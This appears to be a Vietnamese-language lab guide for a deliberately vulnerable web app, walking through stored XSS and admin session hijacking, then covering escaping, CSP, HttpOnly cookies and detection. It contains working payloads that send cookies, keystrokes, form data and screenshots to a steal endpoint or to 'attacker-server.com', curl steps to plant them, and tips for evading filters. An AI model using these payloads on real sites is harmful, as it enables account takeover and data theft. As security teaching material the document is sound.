# 🎯 XSS + Session Hijacking Demo

## Kịch bản Tấn công

**Tình huống:** Attacker muốn đánh cắp cookie của admin mà không cần biết password

**Phương pháp:** Stored XSS + Session Hijacking

## 📝 Các bước thực hiện

### Bước 1: Attacker đăng nhập (user1)

```
Username: user1
Password: password1
```

### Bước 2: Attacker post comment với XSS payload

**Payload 1 - Test XSS:**

```html
<script>
    alert(document.cookie);
</script>
```

**Payload 2 - Steal Cookie (Internal):**

```html
<script>
    fetch("/api/steal?cookie=" + document.cookie);
</script>
```

**Payload 3 - Steal Cookie (External Server):**

```html
<script>
    var img = new Image();
    img.src = "http://attacker-server.com/steal?cookie=" + document.cookie;
</script>
```

**Payload 4 - Stealthy (Không redirect):**

```html
<img src="x" onerror="fetch('/api/steal?cookie='+document.cookie)" />
```

### Bước 3: Admin vào xem comment

1. Admin đăng nhập (hoặc đã đăng nhập sẵn)
2. Admin vào trang `/lab/auth`
3. Admin xem bảng tin comments
4. **Script tự động thực thi!**
5. Cookie của admin bị gửi đến attacker's server

### Bước 4: Attacker thu thập cookie

**Cách 1: Xem server console**

```bash
🚨 STOLEN COOKIE RECEIVED:
Timestamp: 2025-10-16T12:34:56.789Z
Cookie: auth=admin:admin123
IP: ::1
User-Agent: Mozilla/5.0...
```

**Cách 2: Xem trong database**

-   Đăng nhập lại
-   Xem comments
-   Tìm entry `[HACKER-LOG]`
-   Copy cookie value

### Bước 5: Attacker sử dụng cookie để giả mạo admin

1. Mở DevTools (F12)
2. Application → Cookies
3. Sửa cookie `auth` thành: `admin:admin123`
4. Refresh trang
5. **Đã đăng nhập với quyền admin!**

## 🧪 Demo với curl

### 1. Login as attacker (user1)

```bash
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"user1","password":"password1"}'
```

### 2. Post XSS payload

```bash
curl -X POST http://localhost:3000/api/comment \
  -H "Content-Type: application/json" \
  -H "Cookie: auth=user1:password1" \
  -d '{"comment":"<script>fetch(\"/api/steal?cookie=\"+document.cookie)</script>"}'
```

### 3. Admin views comments (simulate)

```bash
curl http://localhost:3000/lab/auth \
  -H "Cookie: auth=admin:admin123" \
  > /dev/null
# Script will execute in browser!
```

### 4. Check stolen cookies

```bash
# Check server console or:
curl http://localhost:3000/lab/auth -H "Cookie: auth=user1:password1" \
  | grep "HACKER-LOG"
```

## 🎭 Advanced Payloads

### 1. Keylogger

```html
<script>
    document.onkeypress = function (e) {
        fetch("/api/steal?key=" + e.key);
    };
</script>
```

### 2. Form Hijacking

```html
<script>
    document.forms[0].onsubmit = function () {
        fetch("/api/steal?data=" + new FormData(this));
    };
</script>
```

### 3. Screenshot (if supported)

```html
<script>
    html2canvas(document.body).then((canvas) => {
        fetch("/api/steal?img=" + canvas.toDataURL());
    });
</script>
```

### 4. Persistent backdoor

```html
<script>
    setInterval(() => {
        fetch("/api/steal?heartbeat=" + document.cookie);
    }, 5000);
</script>
```

## 🛡️ Phòng chống

### ❌ Code không an toàn (hiện tại)

```javascript
// Template (EJS)
<div class="comment-body">
  <%- comment.comment %>  // Render HTML thô!
</div>
```

### ✅ Code an toàn

```javascript
// Template (EJS)
<div class="comment-body">
  <%= comment.comment %>  // Escape HTML
</div>

// Hoặc sanitize input
const sanitizeHtml = require('sanitize-html');
const clean = sanitizeHtml(dirtyInput);
```

### ✅ CSP (Content Security Policy)

```javascript
app.use((req, res, next) => {
    res.setHeader(
        "Content-Security-Policy",
        "default-src 'self'; script-src 'self'"
    );
    next();
});
```

### ✅ HttpOnly Cookie

```javascript
res.cookie("auth", token, {
    httpOnly: true, // Không thể đọc bằng JavaScript
    secure: true, // Chỉ gửi qua HTTPS
    sameSite: "strict",
});
```

## 📊 Impact

### Nếu thành công, attacker có thể:

1. ✅ Đánh cắp session của bất kỳ user nào (kể cả admin)
2. ✅ Thực thi code trên trình duyệt của victim
3. ✅ Đọc mọi thông tin trên trang (DOM)
4. ✅ Gửi request với quyền của victim
5. ✅ Redirect victim đến phishing page
6. ✅ Cài backdoor persistent

## 🔍 Detection

### Dấu hiệu bị tấn công:

1. **Server logs:**

    - Requests đến `/api/steal` bất thường
    - User-Agent lạ

2. **Network traffic:**

    - Outbound requests đến domain lạ
    - Cookie data trong URL params

3. **Database:**
    - Comments chứa `<script>` tags
    - Suspicious HTML/JavaScript

## 💡 Tips

-   Luôn test với `<script>alert(1)</script>` trước
-   Sử dụng `fetch()` thay vì `XMLHttpRequest` (modern)
-   Encode payload nếu bị filter: `%3Cscript%3E`
-   Sử dụng event handlers nếu script bị block: `<img onerror=>`
-   Combine với CSRF để tối đa impact

---

⚠️ **CHỈ SỬ DỤNG TRONG LAB - KHÔNG THỬ TRÊN HỆ THỐNG THỰC!**
